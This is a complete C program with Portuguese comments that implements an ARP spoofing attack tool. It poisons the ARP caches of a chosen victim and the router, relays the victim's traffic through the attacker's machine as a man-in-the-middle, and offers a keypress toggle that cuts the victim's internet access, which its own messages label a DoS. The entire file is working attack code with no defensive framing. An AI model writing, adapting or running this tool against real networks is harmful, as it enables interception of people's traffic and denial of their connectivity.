#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <signal.h>
#include <errno.h>
#include <termios.h>
#include <time.h>

#define ETH_ALEN 6
#define ARP_REQUEST 1
#define ARP_REPLY 2

struct arp_header {
    unsigned short ar_hrd;
    unsigned short ar_pro;
    unsigned char  ar_hln;
    unsigned char  ar_pln;
    unsigned short ar_op;
    unsigned char  ar_sha[ETH_ALEN];
    unsigned char  ar_sip[4];
    unsigned char  ar_tha[ETH_ALEN];
    unsigned char  ar_tip[4];
};

struct arp_packet {
    struct ethhdr eth;
    struct arp_header arp;
};

int sock_raw;
unsigned char my_mac[ETH_ALEN];
unsigned char target_mac[ETH_ALEN];
unsigned char router_mac[ETH_ALEN];
char *target_ip_str;
char *router_ip_str;
char *iface;
int ifindex;
int forwarding_enabled = 1; // 1 = Com Internet, 0 = Sem Internet

struct termios orig_termios;

void reset_terminal_mode() {
    tcsetattr(0, TCSANOW, &orig_termios);
}

void set_noncanonical_mode() {
    struct termios raw;
    tcgetattr(0, &orig_termios);
    atexit(reset_terminal_mode);
    raw = orig_termios;
    raw.c_lflag &= ~(ECHO | ICANON);
    tcsetattr(0, TCSANOW, &raw);
}

void restore_network();

void handle_sigint(int sig) {
    (void)sig;
    printf("\n[!] A sair... A restaurar a rede original...\n");
    restore_network();
    if (sock_raw >= 0) close(sock_raw);
    printf("[+] Rede restaurada. Adeus!\n");
    exit(0);
}

int get_local_info(const char *iface_name, unsigned char *mac, char *ip_out, int *idx) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    strncpy(ifr.ifr_name, iface_name, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return -1; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    *idx = ifr.ifr_ifindex;
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) { close(fd); return -1; }
    struct sockaddr_in *ip_addr = (struct sockaddr_in *)&ifr.ifr_addr;
    strcpy(ip_out, inet_ntoa(ip_addr->sin_addr));
    close(fd);
    return 0;
}

int resolve_mac(int sock, int ifindex, unsigned char *src_mac, const char *src_ip, const char *dest_ip, unsigned char *dest_mac_out) {
    struct arp_packet packet;
    struct sockaddr_ll socket_address;
    unsigned char broadcast_mac[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char zero_mac[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    memset(&packet, 0, sizeof(packet));
    memcpy(packet.eth.h_dest, broadcast_mac, ETH_ALEN);
    memcpy(packet.eth.h_source, src_mac, ETH_ALEN);
    packet.eth.h_proto = htons(ETH_P_ARP);
    packet.arp.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp.ar_pro = htons(ETH_P_IP);
    packet.arp.ar_hln = ETH_ALEN;
    packet.arp.ar_pln = 4;
    packet.arp.ar_op = htons(ARP_REQUEST);
    memcpy(packet.arp.ar_sha, src_mac, ETH_ALEN);
    inet_pton(AF_INET, src_ip, packet.arp.ar_sip);
    memcpy(packet.arp.ar_tha, zero_mac, ETH_ALEN);
    inet_pton(AF_INET, dest_ip, packet.arp.ar_tip);

    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, broadcast_mac, ETH_ALEN);

    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    int attempts = 3;
    while (attempts--) {
        sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr*)&socket_address, sizeof(socket_address));
        unsigned char buffer[65536];
        while (1) {
            int data_len = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (data_len < 0) break;
            struct arp_packet *recv_packet = (struct arp_packet *)buffer;
            if (ntohs(recv_packet->eth.h_proto) == ETH_P_ARP && ntohs(recv_packet->arp.ar_op) == ARP_REPLY) {
                struct in_addr resp_ip;
                memcpy(&resp_ip, recv_packet->arp.ar_sip, 4);
                if (strcmp(inet_ntoa(resp_ip), dest_ip) == 0) {
                    memcpy(dest_mac_out, recv_packet->arp.ar_sha, ETH_ALEN);
                    return 0;
                }
            }
        }
    }
    return -1;
}

void send_spoof(int sock, int ifindex, unsigned char *src_mac, const char *spoof_ip, const char *target_ip, const unsigned char *target_mac) {
    struct arp_packet packet;
    struct sockaddr_ll socket_address;
    memset(&packet, 0, sizeof(packet));
    memcpy(packet.eth.h_dest, target_mac, ETH_ALEN);
    memcpy(packet.eth.h_source, src_mac, ETH_ALEN);
    packet.eth.h_proto = htons(ETH_P_ARP);
    packet.arp.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp.ar_pro = htons(ETH_P_IP);
    packet.arp.ar_hln = ETH_ALEN;
    packet.arp.ar_pln = 4;
    packet.arp.ar_op = htons(ARP_REPLY);
    memcpy(packet.arp.ar_sha, src_mac, ETH_ALEN);
    inet_pton(AF_INET, spoof_ip, packet.arp.ar_sip);
    memcpy(packet.arp.ar_tha, target_mac, ETH_ALEN);
    inet_pton(AF_INET, target_ip, packet.arp.ar_tip);

    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, target_mac, ETH_ALEN);
    sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr*)&socket_address, sizeof(socket_address));
}

void restore_network() {
    for (int i = 0; i < 3; i++) {
        send_spoof(sock_raw, ifindex, router_mac, router_ip_str, target_ip_str, target_mac);
        send_spoof(sock_raw, ifindex, target_mac, target_ip_str, router_ip_str, router_mac);
        usleep(200000);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Uso: sudo ./arpspoof_toggle <INTERFACE> <IP_DO_ALVO> <IP_DO_ROUTER>\n");
        return 1;
    }

    iface = argv[1];
    target_ip_str = argv[2];
    router_ip_str = argv[3];

    signal(SIGINT, handle_sigint);
    set_noncanonical_mode();

    char my_ip[INET_ADDRSTRLEN];
    if (get_local_info(iface, my_mac, my_ip, &ifindex) < 0) {
        perror("[-] Erro ao obter dados da interface");
        return 1;
    }

    sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock_raw < 0) {
        perror("[-] Erro ao criar raw socket");
        return 1;
    }

    printf("[*] A resolver MACs...\n");
    if (resolve_mac(sock_raw, ifindex, my_mac, my_ip, target_ip_str, target_mac) < 0) {
        printf("[-] Erro ao obter MAC do alvo.\n");
        close(sock_raw);
        return 1;
    }
    if (resolve_mac(sock_raw, ifindex, my_mac, my_ip, router_ip_str, router_mac) < 0) {
        printf("[-] Erro ao obter MAC do router.\n");
        close(sock_raw);
        return 1;
    }

    printf("\n==================================================\n");
    printf("[+] Spoofer Ativo! Pressiona a tecla [T] para alternar.\n");
    printf("[+] Estado atual: [ COM INTERNET / MITM ATIVO ]\n");
    printf("[+] Pressiona [Ctrl+C] para sair.\n");
    printf("==================================================\n\n");

    time_t last_arp = 0;

    while (1) {
        time_t now = time(NULL);
        // Enviar pacotes ARP a cada 2 segundos para manter o spoof
        if (now - last_arp >= 2) {
            send_spoof(sock_raw, ifindex, my_mac, router_ip_str, target_ip_str, target_mac);
            send_spoof(sock_raw, ifindex, my_mac, target_ip_str, router_ip_str, router_mac);
            last_arp = now;
        }

        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(sock_raw, &readfds);
        FD_SET(STDIN_FILENO, &readfds);

        struct timeval tv;
        tv.tv_sec = 0;
        tv.tv_usec = 100000; // 100ms de timeout para o select

        int activity = select(sock_raw + 1, &readfds, NULL, NULL, &tv);
        if (activity < 0) {
            if (errno == EINTR) continue;
            break;
        }

        // 1. Verificar se o utilizador pressionou a tecla 'T'
        if (FD_ISSET(STDIN_FILENO, &readfds)) {
            char c = getchar();
            if (c == 't' || c == 'T') {
                forwarding_enabled = !forwarding_enabled;
                if (forwarding_enabled) {
                    printf("\r[+] TOGGLE: Forwarding ATIVADO -> Vítima COM internet.      \n");
                } else {
                    printf("\r[!] TOGGLE: Forwarding DESATIVADO -> Vítima SEM internet (DoS).\n");
                }
                fflush(stdout);
            }
        }

        // 2. Capturar e reencaminhar pacotes
        if (FD_ISSET(sock_raw, &readfds)) {
            unsigned char buffer[65536];
            int data_len = recvfrom(sock_raw, buffer, sizeof(buffer), 0, NULL, NULL);
            if (data_len > 0) {
                struct ethhdr *eth = (struct ethhdr *)buffer;

                // Apenas processar pacotes IP e ignorar pacotes enviados por nós próprios
                if (ntohs(eth->h_proto) == ETH_P_IP) {
                    if (memcmp(eth->h_source, my_mac, ETH_ALEN) != 0) {
                        struct iphdr *iph = (struct iphdr *)(buffer + sizeof(struct ethhdr));
                        char src_ip[16], dst_ip[16];
                        struct in_addr s_addr, d_addr;
                        s_addr.s_addr = iph->saddr;
                        d_addr.s_addr = iph->daddr;
                        strcpy(src_ip, inet_ntoa(s_addr));
                        strcpy(dst_ip, inet_ntoa(d_addr));

                        if (forwarding_enabled) {
                            struct sockaddr_ll socket_address;
                            memset(&socket_address, 0, sizeof(socket_address));
                            socket_address.sll_family = AF_PACKET;
                            socket_address.sll_protocol = htons(ETH_P_IP);
                            socket_address.sll_ifindex = ifindex;
                            socket_address.sll_halen = ETH_ALEN;

                            if (strcmp(src_ip, target_ip_str) == 0 && strcmp(dst_ip, router_ip_str) != 0) {
                                // Alvo -> Router
                                memcpy(eth->h_source, my_mac, ETH_ALEN);
                                memcpy(eth->h_dest, router_mac, ETH_ALEN);
                                memcpy(socket_address.sll_addr, router_mac, ETH_ALEN);
                                sendto(sock_raw, buffer, data_len, 0, (struct sockaddr*)&socket_address, sizeof(socket_address));
                            }
                            else if (strcmp(src_ip, router_ip_str) == 0 && strcmp(dst_ip, target_ip_str) == 0) {
                                // Router -> Alvo
                                memcpy(eth->h_source, my_mac, ETH_ALEN);
                                memcpy(eth->h_dest, target_mac, ETH_ALEN);
                                memcpy(socket_address.sll_addr, target_mac, ETH_ALEN);
                                sendto(sock_raw, buffer, data_len, 0, (struct sockaddr*)&socket_address, sizeof(socket_address));
                            }
                        }
                    }
                }
            }
        }
    }

    close(sock_raw);
    return 0;
}